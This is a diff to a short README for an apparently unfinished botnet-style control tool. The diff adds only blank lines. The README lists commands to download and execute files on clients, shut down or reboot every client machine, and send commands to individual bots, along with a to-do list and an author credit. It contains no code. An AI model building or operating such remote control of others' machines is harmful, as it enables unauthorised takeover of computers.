@@ -16,18 +16,25 @@ Amount of time each link should be visited.
 
 
 Download: Downloads a File.
+
 Execute: needs to be fixed to be honest i didnt have the time to continue with this project.
+
 Shutdown: shuts all clients down
+
 Restart: Reboots all client machines
 
 
 Stuff that needs to be fixed:
 -----------------------------
 Execute Command, locate the downloaded file and execute it.
+
 Clients: amount of connected clients needs to be counted.
+
 Send to (Cl): send commands to a specific client/Bot.
+
 url: Use also other websites.
 
 
 by: ilir "skifter" Prenku
+
 http://wwww.iliri.net
